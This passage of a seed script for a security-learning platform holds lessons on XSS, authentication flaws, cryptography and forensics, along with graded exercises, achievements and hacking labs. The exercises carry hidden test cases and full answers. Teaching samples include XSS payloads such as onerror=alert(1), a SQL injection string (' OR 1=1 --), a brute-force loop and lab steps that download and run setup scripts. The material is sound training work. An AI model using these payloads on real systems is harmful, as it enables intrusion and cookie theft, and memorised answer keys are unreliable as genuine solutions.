2. **SameSite cookies**: Set \`SameSite=Strict\` or \`SameSite=Lax\` on session cookies
3. **Verify Origin header**: Check that requests come from your own domain
4. **Double-submit cookie**: Send the token in both a cookie and a request parameter

### XSS + CSRF = Full Account Takeover

XSS can bypass CSRF protections! If an attacker can execute JavaScript via XSS, they can:
- Read CSRF tokens from the page
- Submit forms on behalf of the user
- Steal session cookies (if not HTTP-only)

This is why **defense in depth** is critical — no single defense is sufficient.

## HTML Sanitization

When you must accept HTML input (e.g., rich text editors), sanitize it:

\`\`\`python
def sanitize_html(html_input):
    # Remove dangerous tags and attributes
    dangerous_tags = ['script', 'iframe', 'object', 'embed', 'form']
    for tag in dangerous_tags:
        html_input = html_input.replace(f'<{tag}', f'&lt;{tag}')
        html_input = html_input.replace(f'</{tag}', f'&lt;/{tag}')
    # Remove event handlers
    import re
    html_input = re.sub(r'on\\w+\\s*=', '', html_input)
    return html_input
\`\`\`

Always use a well-tested sanitization library (like DOMPurify on the client side) rather than rolling your own — the nuances of HTML parsing make DIY sanitization error-prone.`,
    order: 2,
    xpReward: 75,
    category: 'cyber',
    exercises: [
      {
        title: 'XSS Sanitizer',
        slug: 'xss-sanitizer',
        description: 'Write a function `sanitize_html(html)` that removes dangerous HTML tags (`<script>`, `<iframe>`, `<object>`, `<embed>`) and event handler attributes (`onclick`, `onerror`, `onload`, etc. — any attribute starting with `on`) from the input string. Replace dangerous opening tags with `&lt;tagname` and remove `on*` attributes entirely.',
        starterCode: `def sanitize_html(html):
    # Remove dangerous tags and on* event handlers
    pass`,
        language: 'python',
        order: 1,
        xpReward: 35,
        hints: [
          { level: 1, content: 'For dangerous tags: replace `<script`, `<iframe`, `<object`, `<embed` with their escaped versions. For event handlers: use regex `on\\w+\\s*=` to find and remove them.', xpCost: 5 },
          { level: 2, content: 'Step 1: `for tag in ["script", "iframe", "object", "embed"]: html = html.replace(f"<{tag}", f"&lt;{tag}")`. Step 2: `import re; html = re.sub(r"on\\w+\\s*=", "", html, flags=re.IGNORECASE)`. Return the cleaned string.', xpCost: 10 },
          { level: 3, content: 'Complete: iterate dangerous tags to escape opening tags, then use `re.sub(r"on\\w+\\s*=", "", html, flags=re.IGNORECASE)` to strip event handlers.', xpCost: 20 },
        ],
        testCases: [
          { input: 'sanitize_html("<script>alert(1)</script>")', expectedOutput: '&lt;script>alert(1)</script>', isHidden: false, order: 1 },
          { input: 'sanitize_html("<p>Hello</p>")', expectedOutput: '<p>Hello</p>', isHidden: false, order: 2 },
          { input: 'sanitize_html(\'<img src=x onerror=alert(1)>\')', expectedOutput: '<img src=x >', isHidden: true, order: 3 },
          { input: 'sanitize_html("<iframe src=\\"evil.com\\"></iframe>")', expectedOutput: '&lt;iframe src="evil.com"></iframe>', isHidden: true, order: 4 },
          { input: 'sanitize_html("<div onclick=\\"evil()\\">Click</div>")', expectedOutput: '<div >Click</div>', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 1

  // Lesson 4.3: Authentication Flaws
  const lesson4_3 = await createLessonWithExercises(phases[3].id, {
    title: 'Authentication Flaws',
    slug: 'authentication-flaws',
    description: 'Learn about broken authentication — weak passwords, session management issues, and token vulnerabilities that let attackers impersonate users.',
    contentMdx: `# Authentication Flaws

Broken authentication is consistently in the OWASP Top 10 because it is both common and devastating. When authentication fails, attackers gain unauthorized access to user accounts — and from there, they can escalate privileges, steal data, and compromise entire systems.

## Common Authentication Vulnerabilities

### 1. Weak Password Policies

Allowing users to set "123456" or "password" as their password is an open invitation for credential stuffing attacks. Strong password policies require:
- Minimum 8 characters (preferably 12+)
- No commonly breached passwords (check against HaveIBeenPwned)
- Multi-factor authentication (MFA)

### 2. Credential Stuffing

Attackers take leaked username/password pairs from one breach and try them on other sites. **Why it works**: 65% of people reuse passwords across sites.

**Defense**: Rate limiting, CAPTCHA, MFA, breach-detection APIs.

### 3. Brute Force Attacks

Attackers systematically try every possible password:

\`\`\`python
# Conceptual brute force (do NOT use maliciously!)
for password in wordlist:
    if try_login(username, password):
        print(f"Found: {password}")
        break
\`\`\`

**Defense**: Account lockout, progressive delays, rate limiting, MFA.

### 4. Session Fixation

The attacker sets the victim's session ID before they log in. After the victim authenticates, the attacker uses the known session ID to hijack the session.

**Defense**: Always regenerate the session ID after login.

### 5. Insecure Token Storage

Storing tokens in \`localStorage\` makes them accessible to any JavaScript on the page — including XSS payloads. Store tokens in **HTTP-only, Secure, SameSite cookies** instead.

## JSON Web Tokens (JWT)

JWTs are the most common modern authentication mechanism. A JWT has three parts:

\`\`\`
header.payload.signature
\`\`\`

- **Header**: Algorithm and token type (Base64URL encoded)
- **Payload**: Claims — user ID, role, expiration (Base64URL encoded)
- **Signature**: HMAC or RSA signature over header + payload

### Common JWT Vulnerabilities

1. **Algorithm confusion**: Setting \`"alg": "none"\` to bypass signature verification
2. **Weak secrets**: Using "secret" or "password" as the HMAC key
3. **No expiration**: Tokens that never expire can be used forever
4. **Sensitive data in payload**: Base64 is encoding, NOT encryption — anyone can read it

\`\`\`python
import base64
import json

# Anyone can decode a JWT payload!
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.signature"
payload = token.split(".")[1]
# Add padding
payload += "=" * (4 - len(payload) % 4)
decoded = json.loads(base64.b64decode(payload))
print(decoded)  # {"user": "alice", "role": "admin"}
\`\`\`

## Token Validation Checklist

When validating an authentication token, always check:
1. **Structure**: Correct format (3 dot-separated parts for JWT)
2. **Signature**: Cryptographically valid
3. **Expiration**: Not expired
4. **Issuer**: Issued by a trusted authority
5. **Audience**: Intended for your application
6. **Claims**: All required fields present and valid

Authentication is the gatekeeper of your application. Get it wrong, and nothing else matters — an attacker with valid credentials has the same access as a legitimate user.`,
    order: 3,
    xpReward: 75,
    category: 'cyber',
    exercises: [
      {
        title: 'Token Validator',
        slug: 'token-validator',
        description: 'Write a function `validate_jwt_structure(token)` that takes a string and returns `True` if it has a valid JWT-like structure (three Base64URL-encoded segments separated by dots), `False` otherwise. Each segment must be non-empty and contain only valid Base64URL characters (A-Z, a-z, 0-9, -, _).',
        starterCode: `import re

def validate_jwt_structure(token):
    # Return True if token has valid JWT structure (3 base64url segments)
    pass`,
        language: 'python',
        order: 1,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Split the token by "." and verify there are exactly 3 parts. Then check each part contains only Base64URL characters: A-Z, a-z, 0-9, dash, underscore.', xpCost: 5 },
          { level: 2, content: 'Split by ".", check len == 3. For each part: `bool(re.match(r"^[A-Za-z0-9_-]+$", part))` and part is non-empty. All conditions must pass.', xpCost: 10 },
          { level: 3, content: 'Complete: `def validate_jwt_structure(token): parts = token.split("."); return len(parts) == 3 and all(re.match(r"^[A-Za-z0-9_-]+$", p) for p in parts if p)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'validate_jwt_structure("eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UifQ.c2lnbmF0dXJl")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'validate_jwt_structure("not.a.valid.jwt!")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'validate_jwt_structure("header.payload")', expectedOutput: 'False', isHidden: true, order: 3 },
          { input: 'validate_jwt_structure("a.b.c")', expectedOutput: 'True', isHidden: true, order: 4 },
          { input: 'validate_jwt_structure("..signature")', expectedOutput: 'False', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 1

  // ============================================================
  // PHASE 5: ADVANCED SECURITY
  // ============================================================

  // Lesson 5.1: Cryptography
  const lesson5_1 = await createLessonWithExercises(phases[4].id, {
    title: 'Cryptography',
    slug: 'cryptography',
    description: 'Deep dive into cryptographic primitives — symmetric encryption, asymmetric encryption, hashing, and how they protect data in the real world.',
    contentMdx: `# Cryptography

Cryptography is the mathematical backbone of cybersecurity. It transforms readable data into unreadable ciphertext, protecting confidentiality, integrity, and authenticity. Without cryptography, there would be no secure web browsing, no encrypted messaging, and no digital trust.

## Symmetric Encryption

The same key encrypts and decrypts data. Think of it as a locked box where both parties have copies of the same key:

\`\`\`
Plaintext + Key → [Encrypt] → Ciphertext
Ciphertext + Key → [Decrypt] → Plaintext
\`\`\`

Common symmetric algorithms:
- **AES-256**: The gold standard — used by governments and banks worldwide
- **ChaCha20**: Faster on mobile devices, used in TLS 1.3
- **DES/3DES**: Legacy algorithms — DO NOT use (broken)

\`\`\`python
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

ciphertext = cipher.encrypt(b"Secret message")
plaintext = cipher.decrypt(ciphertext)
\`\`\`

### Modes of Operation

AES alone encrypts 16-byte blocks. Modes define how to chain blocks:
- **ECB** (Electronic Codebook): Each block encrypted independently — INSECURE (identical blocks produce identical ciphertext)
- **CBC** (Cipher Block Chaining): Each block XORed with previous ciphertext — requires IV
- **GCM** (Galois/Counter Mode): Provides both encryption and authentication — modern standard

## Asymmetric Encryption

Two different but mathematically related keys: a **public key** (shared openly) and a **private key** (kept secret):

\`\`\`
Plaintext + Public Key → [Encrypt] → Ciphertext
Ciphertext + Private Key → [Decrypt] → Plaintext
\`\`\`

Common asymmetric algorithms:
- **RSA**: The original, based on factoring large primes
- **ECC** (Elliptic Curve Cryptography): Same security with smaller keys
- **Diffie-Hellman**: Secure key exchange over insecure channels

## Hashing

A hash function maps arbitrary-length input to a fixed-length output (digest). It is **one-way** — you cannot reverse a hash to recover the input:

\`\`\`python
import hashlib

sha256_hash = hashlib.sha256(b"password").hexdigest()
# 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
\`\`\`

Properties of a good hash function:
1. **Deterministic**: Same input always produces same output
2. **Fast to compute**: Efficient for verification
3. **Pre-image resistant**: Cannot reverse to find input
4. **Collision resistant**: Cannot find two inputs with same hash
5. **Avalanche effect**: Small input change → drastically different output

### Hashing vs Encryption

| Property | Hashing | Encryption |
|----------|---------|------------|
| Direction | One-way | Two-way |
| Key | No key | Requires key |
| Purpose | Integrity verification | Confidentiality |
| Example | Password storage | Secure communication |

### Password Hashing

**Never** use plain SHA-256 for passwords! Use **bcrypt**, **scrypt**, or **Argon2** — they add a **salt** and are deliberately slow to deter brute-force attacks:

\`\`\`python
import bcrypt

# Hashing
hashed = bcrypt.hashpw(b"password123", bcrypt.gensalt())

# Verification
bcrypt.checkpw(b"password123", hashed)  # True
\`\`\`

## Digital Signatures

Asymmetric encryption also enables **signatures** — proving a message came from a specific sender and was not tampered with:

\`\`\`
Message + Private Key → [Sign] → Signature
Message + Signature + Public Key → [Verify] → True/False
\`\`\`

This is how TLS certificates, software updates, and blockchain transactions work.

Cryptography is complex and subtle. A single implementation mistake can make your encryption worthless. Always use well-tested libraries and never roll your own crypto for production.`,
    order: 1,
    xpReward: 75,
    category: 'cyber',
    exercises: [
      {
        title: 'Hash Verifier',
        slug: 'hash-verifier',
        description: 'Write a function `verify_hash(data, expected_hash)` that takes a string `data` and a string `expected_hash`, computes the SHA-256 hash of `data`, and returns `True` if it matches `expected_hash`, `False` otherwise. Both should be compared as lowercase hex strings.',
        starterCode: `import hashlib

def verify_hash(data, expected_hash):
    # Compute SHA-256 hash of data and compare with expected_hash
    pass`,
        language: 'python',
        order: 1,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use `hashlib.sha256(data.encode()).hexdigest()` to compute the hash, then compare it to `expected_hash.lower()`.', xpCost: 5 },
          { level: 2, content: 'Compute: `computed = hashlib.sha256(data.encode()).hexdigest().lower()`. Return `computed == expected_hash.lower()`.', xpCost: 10 },
          { level: 3, content: 'Complete: `def verify_hash(data, expected_hash): return hashlib.sha256(data.encode()).hexdigest().lower() == expected_hash.lower()`', xpCost: 20 },
        ],
        testCases: [
          { input: 'verify_hash("hello", "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'verify_hash("hello", "wronghash")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'verify_hash("", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")', expectedOutput: 'True', isHidden: true, order: 3 },
          { input: 'verify_hash("password", "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8")', expectedOutput: 'True', isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 1

  // Lesson 5.2: Digital Forensics
  const lesson5_2 = await createLessonWithExercises(phases[4].id, {
    title: 'Digital Forensics',
    slug: 'digital-forensics',
    description: 'Learn how to investigate digital evidence — file analysis, log examination, and data recovery techniques used in incident response.',
    contentMdx: `# Digital Forensics

Digital forensics is the art and science of investigating digital evidence. When a breach occurs, forensic analysts piece together what happened, how it happened, and who was responsible — using nothing but the digital traces left behind.

## The Forensic Process

1. **Identification**: Determine what evidence exists and where
2. **Preservation**: Collect and protect evidence (chain of custody)
3. **Analysis**: Examine evidence for relevant findings
4. **Documentation**: Record findings in a forensic report
5. **Presentation**: Present findings in legal proceedings

## File Analysis

Every file has a **signature** (magic bytes) in its header that identifies its true type — regardless of its extension:

| File Type | Magic Bytes (Hex) | Extension |
|-----------|-------------------|-----------|
| PNG | \`89 50 4E 47\` | .png |
| JPEG | \`FF D8 FF\` | .jpg |
| PDF | \`25 50 44 46\` (%PDF) | .pdf |
| ZIP | \`50 4B 03 04\` (PK) | .zip |
| GIF | \`47 49 46 38\` (GIF8) | .gif |
| ELF | \`7F 45 4C 46\` | (Linux executable) |

Attackers often change file extensions to evade detection — but they cannot change the magic bytes without corrupting the file. This is why **file type verification should always check magic bytes**, not extensions.

\`\`\`python
FILE_SIGNATURES = {
    b"\\x89PNG": "PNG Image",
    b"\\xff\\xd8\\xff": "JPEG Image",
    b"%PDF": "PDF Document",
    b"PK\\x03\\x04": "ZIP Archive",
    b"GIF8": "GIF Image",
    b"\\x7fELF": "ELF Executable",
}

def identify_file(file_bytes):
    for sig, file_type in FILE_SIGNATURES.items():
        if file_bytes.startswith(sig):
            return file_type
    return "Unknown"
\`\`\`

## Metadata Analysis

Files contain hidden metadata that can reveal:
- **Author** and **creation date** (EXIF data in images)
- **GPS coordinates** (photos taken with smartphones)
- **Software used** to create the file
- **Revision history** (Word documents)

\`\`\`python
# Example: checking for suspicious metadata
from PIL import Image
from PIL.ExifTags import TAGS

img = Image.open("suspicious.jpg")
exif_data = img._getexif()
if exif_data:
    for tag_id, value in exif_data.items():
        tag = TAGS.get(tag_id, tag_id)
        print(f"{tag}: {value}")
\`\`\`

## Log Investigation

Logs are the primary source of forensic evidence:

- **Access logs**: Who accessed what and when
- **Authentication logs**: Login successes and failures
- **Firewall logs**: Network connections allowed and blocked
- **Application logs**: Error messages and user actions

### Forensic Timeline

Create a timeline of events by correlating timestamps across multiple log sources:

\`\`\`
2024-01-15 03:14:22 — Failed login attempt from 192.168.1.100 (auth.log)
2024-01-15 03:14:23 — Failed login attempt from 192.168.1.100 (auth.log)
2024-01-15 03:14:24 — Successful login from 192.168.1.100 (auth.log)
2024-01-15 03:14:30 — Privilege escalation: user → root (syslog)
2024-01-15 03:15:01 — Database export initiated (app.log)
2024-01-15 03:16:45 — Large data transfer to external IP 45.33.32.156 (firewall.log)
\`\`\`

This timeline tells a story: brute force → compromise → escalation → data exfiltration.

## Data Recovery

Deleted data is often recoverable because "deleting" a file typically only removes the reference — the actual data remains on disk until overwritten:

- **File carving**: Reconstruct files from raw disk data using signatures
- **Slack space**: Data hidden in the unused space at the end of a file's last cluster
- **Steganography**: Data hidden inside other data (e.g., messages hidden in image pixels)

Forensics is where cybersecurity meets detective work. Every byte tells a story — you just need to know how to read it.`,
    order: 2,
    xpReward: 75,
    category: 'cyber',
    exercises: [
      {
        title: 'File Header Analyzer',
        slug: 'file-header-analyzer',
        description: 'Write a function `identify_file_type(hex_header)` that takes a hex string representing the first bytes of a file and returns the file type. Detect: PNG ("89504e47"), JPEG ("ffd8ff"), PDF ("25504446"), ZIP ("504b0304"), GIF ("47494638"). Return the type name or "Unknown" if no match.',
        starterCode: `def identify_file_type(hex_header):
    # Identify file type from hex magic bytes
    # Return "PNG", "JPEG", "PDF", "ZIP", "GIF", or "Unknown"
    pass`,
        language: 'python',
        order: 1,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Define a dictionary mapping hex signature prefixes to file type names. Then check if the input hex string starts with any of these signatures (case-insensitive).', xpCost: 5 },
          { level: 2, content: 'Signatures: {"89504e47": "PNG", "ffd8ff": "JPEG", "25504446": "PDF", "504b0304": "ZIP", "47494638": "GIF"}. For each sig, check `hex_header.lower().startswith(sig)`.', xpCost: 10 },
          { level: 3, content: 'Complete: `def identify_file_type(h): h=h.lower(); sigs={"89504e47":"PNG","ffd8ff":"JPEG","25504446":"PDF","504b0304":"ZIP","47494638":"GIF"}; return next((t for s,t in sigs.items() if h.startswith(s)), "Unknown")`', xpCost: 20 },
        ],
        testCases: [
          { input: 'identify_file_type("89504e470d0a1a0a")', expectedOutput: 'PNG', isHidden: false, order: 1 },
          { input: 'identify_file_type("ffd8ffe000104a46")', expectedOutput: 'JPEG', isHidden: false, order: 2 },
          { input: 'identify_file_type("255044462d312e34")', expectedOutput: 'PDF', isHidden: true, order: 3 },
          { input: 'identify_file_type("504b030414000800")', expectedOutput: 'ZIP', isHidden: true, order: 4 },
          { input: 'identify_file_type("deadbeef")', expectedOutput: 'Unknown', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 1

  // ============================================================
  // PHASE 6: CAPSTONE
  // ============================================================

  // Lesson 6.1: CTF Preparation
  const lesson6_1 = await createLessonWithExercises(phases[5].id, {
    title: 'CTF Preparation',
    slug: 'ctf-preparation',
    description: 'Prepare for Capture The Flag competitions with strategies, tools, and practice challenges that bring together everything you have learned.',
    contentMdx: `# CTF Preparation

**Capture The Flag (CTF)** competitions are the ultimate test of cybersecurity skills. Teams race to find hidden flags — special strings in a specific format (like \`ZTD{something_here}\`) — by solving security challenges across multiple categories.

## CTF Categories

| Category | Skills Tested | Common Challenges |
|----------|---------------|-------------------|
| **Web** | XSS, SQLi, CSRF, auth bypass | Vulnerable web applications |
| **Crypto** | Encryption, hashing, protocols | Break weak ciphers, find key flaws |
| **Forensics** | File analysis, log investigation | Recover deleted files, analyze disk images |
| **Reversing** | Disassembly, decompilation | Analyze binaries to find hidden logic |
| **Pwn** | Buffer overflows, ROP chains | Exploit memory corruption vulnerabilities |
| **Misc** | OSINT, steganography, trivia | Everything else |

## Strategy

### Before the Competition

1. **Practice regularly** on platforms like PicoCTF, Hack The Box, and OverTheWire
2. **Build a toolkit**: Pre-configure your VM with essential tools
3. **Know your strengths**: Specialize in 2-3 categories, but be competent in all
4. **Read write-ups**: Learn from how others solved past challenges

### During the Competition

1. **Scan all challenges first**: Quickly categorize by difficulty and category
2. **Start with easy wins**: Build momentum and confidence
3. **Track progress**: Use a shared spreadsheet to avoid duplicate work
4. **Communicate**: Share findings with teammates — one person's dead end might be another's breakthrough
5. **Time management**: If stuck for 30+ minutes, switch to another challenge

## Essential CTF Tools

### Web
- **Burp Suite** / **OWASP ZAP**: Intercept and modify HTTP requests
- **curl**: Quick HTTP requests from the command line
- **Browser DevTools**: Inspect network traffic, cookies, and JavaScript

### Crypto
- **CyberChef**: The "Swiss Army knife" of encoding/decoding
- **RsaCtfTool**: Automated RSA challenge solver
- **hashcat**: GPU-accelerated hash cracking

### Forensics
- **binwalk**: Firmware and file analysis
- **Volatility**: Memory forensics
- **Autopsy**: Disk image analysis
- **exiftool**: Metadata extraction

### Reversing
- **Ghidra**: Free decompiler (NSA-made, open source)
- **IDA Free**: Industry-standard disassembler
- **strace/ltrace**: System and library call tracing

### General
- **Python**: Write quick scripts for automation
- **Wireshark**: Network packet analysis
- **nmap**: Network scanning

## Finding Hidden Flags

Flags can be hidden anywhere:
- In **source code** (HTML comments, JavaScript variables)
- In **HTTP headers** (custom headers, cookies)
- In **file metadata** (EXIF data, comments)
- In **encoded data** (Base64, hex, ROT13)
- In **steganography** (data hidden in images)
- In **database records** (SQL injection to extract)

\`\`\`python
import re

def find_flag(text, prefix="ZTD"):
    """Search text for CTF flags matching a given prefix."""
    pattern = rf"{prefix}\\{{[^}}]+\\}}"
    return re.findall(pattern, text)
\`\`\`

CTF competitions are where theory meets practice. Every challenge is a puzzle that tests your ability to think creatively, work under pressure, and apply your knowledge in unexpected ways. The skills you build here translate directly to real-world security work.

Good luck, and remember: **the flag is always there — you just have not found it yet.**`,
    order: 1,
    xpReward: 100,
    category: 'cyber',
    exercises: [
      {
        title: 'Flag Finder',
        slug: 'flag-finder',
        description: 'Write a function `find_flags(text, prefix)` that takes a string `text` and a string `prefix`, and returns a list of all CTF flags found. Flags match the pattern `{prefix}{...}` where the content inside braces is one or more word characters (letters, digits, underscores, hyphens). For example, `find_flags("Found ZTD{h3ll0_w0rld} in the file", "ZTD")` returns `["ZTD{h3ll0_w0rld}"]`.',
        starterCode: `import re

def find_flags(text, prefix):
    # Find all flags matching {prefix}{...} pattern
    pass`,
        language: 'python',
        order: 1,
        xpReward: 40,
        hints: [
          { level: 1, content: 'Use `re.findall()` with a regex pattern. The pattern should be: prefix + literal `{` + one or more word characters (including hyphens) + literal `}`. Escape the prefix for regex safety.', xpCost: 5 },
          { level: 2, content: 'Pattern: `re.escape(prefix) + r"\\{[\\w-]+\\}"`. Use `re.findall(pattern, text)` to find all matches.', xpCost: 10 },
          { level: 3, content: 'Complete: `def find_flags(text, prefix): return re.findall(re.escape(prefix) + r"\\{[\\w-]+\\}", text)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'find_flags("Found ZTD{h3ll0_w0rld} in the file", "ZTD")', expectedOutput: "['ZTD{h3ll0_w0rld}']", isHidden: false, order: 1 },
          { input: 'find_flags("No flags here", "ZTD")', expectedOutput: '[]', isHidden: false, order: 2 },
          { input: 'find_flags("ZTD{flag1} and ZTD{flag-2}", "ZTD")', expectedOutput: "['ZTD{flag1}', 'ZTD{flag-2}']", isHidden: true, order: 3 },
          { input: 'find_flags("CTF{found_it}", "CTF")', expectedOutput: "['CTF{found_it}']", isHidden: true, order: 4 },
          { input: 'find_flags("ZTD{a} ZTD{b} ZTD{c}", "ZTD")', expectedOutput: "['ZTD{a}', 'ZTD{b}', 'ZTD{c}']", isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 1

  console.log(`✅ Created ${lessonCount} lessons with ${exerciseCount} exercises (with hints and test cases).\n`)

  // ----------------------------------------------------------
  // 3. CREATE ACHIEVEMENTS
  // ----------------------------------------------------------
  console.log('🏆 Creating achievements...')

  const achievements = await Promise.all([
    db.achievement.create({
      data: {
        slug: 'first-steps',
        title: 'First Steps',
        description: 'Complete your first lesson and take the first step on your journey from zero to dev.',
        icon: 'Footprints',
        xpBonus: 0,
        category: 'cs',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'code-warrior',
        title: 'Code Warrior',
        description: 'Complete 10 exercises. Your coding skills are growing — keep pushing!',
        icon: 'Sword',
        xpBonus: 50,
        category: 'cs',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'algorithm-master',
        title: 'Algorithm Master',
        description: 'Complete all Phase 2 exercises. You have mastered the fundamental data structures and algorithms that power every software system.',
        icon: 'Brain',
        xpBonus: 100,
        category: 'cs',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'script-kiddie',
        title: 'Script Kiddie',
        description: 'Solve your first CTF challenge. Welcome to the world of capture the flag — every expert was once a beginner.',
        icon: 'Terminal',
        xpBonus: 0,
        category: 'cyber',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'hacker',
        title: 'Hacker',
        description: 'Solve 5 CTF challenges. You are no longer a script kiddie — you are thinking like a hacker.',
        icon: 'Skull',
        xpBonus: 50,
        category: 'cyber',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'cyber-ninja',
        title: 'Cyber Ninja',
        description: 'Solve all Phase 4 and Phase 5 labs. Your web security and advanced security skills are razor-sharp.',
        icon: 'Shield',
        xpBonus: 100,
        category: 'cyber',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'on-fire',
        title: 'On Fire',
        description: 'Maintain a 7-day learning streak. Consistency is the key to mastery — you are on fire!',
        icon: 'Flame',
        xpBonus: 25,
        category: 'streak',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'unstoppable',
        title: 'Unstoppable',
        description: 'Maintain a 30-day learning streak. One month of daily practice — you are truly unstoppable.',
        icon: 'Zap',
        xpBonus: 100,
        category: 'streak',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'knowledge-seeker',
        title: 'Knowledge Seeker',
        description: 'Use 50 hints total. Seeking help is not weakness — it is the fastest path to understanding.',
        icon: 'Lightbulb',
        xpBonus: 25,
        category: 'social',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'zero-to-dev',
        title: 'Zero to Dev',
        description: 'Complete all 6 phases. You have gone from zero to dev — this is the ultimate achievement. Welcome to the elite.',
        icon: 'Trophy',
        xpBonus: 500,
        category: 'cs',
      },
    }),
  ])

  console.log(`✅ Created ${achievements.length} achievements.\n`)

  // ----------------------------------------------------------
  // 4. CREATE HACKING LABS
  // ----------------------------------------------------------
  console.log('🧪 Creating hacking labs...')

  const labs = await Promise.all([
    db.hackingLab.create({
      data: {
        title: 'SQL Injection 101',
        slug: 'sql-injection-101',
        description: 'Learn to identify and exploit SQL injection vulnerabilities in a deliberately vulnerable web application.',
        briefingMdx: 'A developer left a misconfigured login form running on their local machine. It constructs SQL queries using string concatenation — a critical security flaw. Your target is running on your localhost. Find what is listening, understand what it does, and extract the flag hidden inside the database.',
        setupMdx: '# Download the challenge files\nwget https://zerotodev.dev/challenges/sql-injection-101/setup.sh\nchmod +x setup.sh && ./setup.sh\n\n# The vulnerable app will run on localhost:8080',
        toolsHint: 'Concepts: SQL injection, authentication bypass, UNION-based injection\nTools you might need: curl, browser DevTools, sqlmap\nYou do NOT need: any external network access',
        phase: 4,
        difficulty: 'easy',
        category: 'web',
        expectedFlag: 'ZTD{sql_1nj3ct10n_b4s1cs}',
        xpReward: 100,
        hintContent: 'Try entering \' OR 1=1 -- as the username. What happens? Then think about how UNION SELECT could help you read from other tables.',
        author: 'Zero to Dev',
        order: 1,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'XSS Playground',
        slug: 'xss-playground',
        description: 'Practice Cross-Site Scripting attacks in a safe environment with reflected and stored XSS challenges.',
        briefingMdx: 'A web application has a search feature and a comment section that reflect user input without sanitization. Craft XSS payloads to execute JavaScript and steal a hidden cookie value containing the flag.',
        setupMdx: '# Download the challenge\nwget https://zerotodev.dev/challenges/xss-playground/app.py\n\n# Install dependencies and run\npip install flask && python app.py\n\n# The app runs on localhost:5000',
        toolsHint: 'Concepts: reflected XSS, stored XSS, cookie theft\nTools: browser DevTools, curl, Burp Suite (optional)\nYou do NOT need: any external network access',
        phase: 4,
        difficulty: 'easy',
        category: 'web',
        expectedFlag: 'ZTD{r3fl3ct3d_xss_ftw}',
        xpReward: 100,
        hintContent: 'The search parameter is vulnerable to reflected XSS. Try injecting a <script> tag. The flag is stored in a cookie that is only accessible via JavaScript.',
        author: 'Zero to Dev',
        order: 2,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Broken Auth',
        slug: 'broken-auth',
        description: 'Exploit multiple authentication vulnerabilities including no rate limiting and predictable session tokens.',
        briefingMdx: 'A web application has multiple authentication flaws: no rate limiting on login, predictable session tokens, and a weak password reset mechanism. Your challenge is to gain unauthorized access to the admin account by exploiting these weaknesses.',
        setupMdx: '# Clone the challenge repo\ngit clone https://github.com/zerotodev-labs/broken-auth.git\ncd broken-auth\n\n# Install and run\npip install -r requirements.txt\npython app.py\n\n# Runs on localhost:3001',
        toolsHint: 'Concepts: brute force, session prediction, weak reset\nTools: curl, hydra (optional), burp suite\nYou do NOT need: any external network access',
        phase: 4,
        difficulty: 'medium',
        category: 'web',
        expectedFlag: 'ZTD{brut3_f0rc3_w1ns}',
        xpReward: 150,
        hintContent: 'The admin username is "admin" and the password is in the top 100 most common passwords. Try a systematic approach rather than guessing randomly.',
        author: 'Zero to Dev',
        order: 3,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Crypto Basics',
        slug: 'crypto-basics',
        description: 'Decode a multi-layered encoded message using Base64, hex, ROT13, and custom ciphers.',
        briefingMdx: 'You intercepted an encoded message. It has been encoded using multiple layers — Base64, hexadecimal, ROT13, and a custom substitution cipher. Identify each encoding layer and reverse it to reveal the hidden flag.',
        setupMdx: '# Download the encoded message\nwget https://zerotodev.dev/challenges/crypto-basics/encoded.txt\n\n# Decode it using Python, CyberChef, or command line tools',
        toolsHint: 'Concepts: Base64, hex encoding, ROT13, substitution ciphers\nTools: Python, CyberChef (web), base64 CLI, xxd\nYou do NOT need: any network access at all',
        phase: 5,
        difficulty: 'easy',
        category: 'crypto',
        expectedFlag: 'ZTD{b4s3_64_d3c0d3}',
        xpReward: 100,
        hintContent: 'The outermost layer is Base64. Decode it, and you will find hex-encoded data inside. After decoding the hex, look for ROT13 patterns.',
        author: 'Zero to Dev',
        order: 4,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Hidden in Plain Sight',
        slug: 'hidden-in-plain-sight',
        description: 'Investigate a suspicious image file to uncover concealed data using steganography and metadata analysis.',
        briefingMdx: 'A suspicious image file was recovered from a suspect computer. At first glance it appears normal — but something is hidden within it. Use steganography analysis, metadata extraction, and file analysis to find the flag.',
        setupMdx: '# Download the image file\nwget https://zerotodev.dev/challenges/hidden-plain-sight/suspicious.jpg\n\n# Analyze it with your forensic tools',
